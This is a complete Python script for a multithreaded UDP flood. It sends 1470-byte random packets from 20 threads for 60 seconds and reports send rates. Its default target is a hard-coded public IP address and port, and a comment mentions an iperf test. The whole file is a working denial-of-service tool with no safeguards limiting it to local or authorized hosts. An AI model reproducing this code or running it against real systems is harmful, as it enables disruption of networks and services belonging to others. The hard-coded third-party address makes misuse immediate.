import socket
import time
import random
import sys
import threading
from datetime import datetime

# Global variables for statistics
packets_sent = 0
lock = threading.Lock()

def send_packets(target_ip, target_port, packet_size, duration):
    """
    Send packets to target continuously for specified duration.
    """
    global packets_sent
    
    # Create UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Create payload - random bytes of specified size
    try:
        payload = random.randbytes(packet_size)
    except AttributeError:
        # For Python versions < 3.9
        payload = bytes(random.getrandbits(8) for _ in range(packet_size))
    
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            # Send packet
            sock.sendto(payload, (target_ip, target_port))
            with lock:
                packets_sent += 1
        except:
            pass
    
    sock.close()

def flood(target_ip, target_port, duration=60, packet_size=1470, num_threads=10):
    """
    Flood a target IP and port with UDP packets using multiple threads.
    """
    global packets_sent
    
    packets_sent = 0
    start_time = time.time()
    
    print(f"[*] Flooding {target_ip}:{target_port} for {duration} seconds with {packet_size}-byte packets")
    print(f"[*] Using {num_threads} threads")
    
    # Create and start threads
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(
            target=send_packets,
            args=(target_ip, target_port, packet_size, duration)
        )
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    # Monitor and display progress
    try:
        while time.time() - start_time < duration:
            time.sleep(1)
            elapsed = time.time() - start_time
            rate = packets_sent / elapsed if elapsed > 0 else 0
            print(f"[+] Sent {packets_sent} packets ({rate:.2f} packets/sec)")
            
    except KeyboardInterrupt:
        print("\n[!] Flooding interrupted by user")
    
    # Wait for all threads to finish
    for thread in threads:
        thread.join()
    
    elapsed_time = time.time() - start_time
    print(f"[*] Flooding completed. Sent {packets_sent} packets in {elapsed_time:.2f} seconds")
    print(f"[*] Average rate: {packets_sent / elapsed_time if elapsed_time > 0 else 0:.2f} packets/sec")

def main():
    # Default parameters
    target_ip = "140.118.123.107"
    target_port = 5001
    duration = 60  # seconds
    packet_size = 1470  # bytes (matches the size in the iperf test)
    num_threads = 20  # default number of threads
    
    # Allow command line arguments to override defaults
    if len(sys.argv) > 1:
        target_ip = sys.argv[1]
    if len(sys.argv) > 2:
        target_port = int(sys.argv[2])
    if len(sys.argv) > 3:
        duration = int(sys.argv[3])
    if len(sys.argv) > 4:
        packet_size = int(sys.argv[4])
    if len(sys.argv) > 5:
        num_threads = int(sys.argv[5])
    
    # Start flooding
    flood(target_ip, target_port, duration, packet_size, num_threads)

if __name__ == "__main__":
    main()
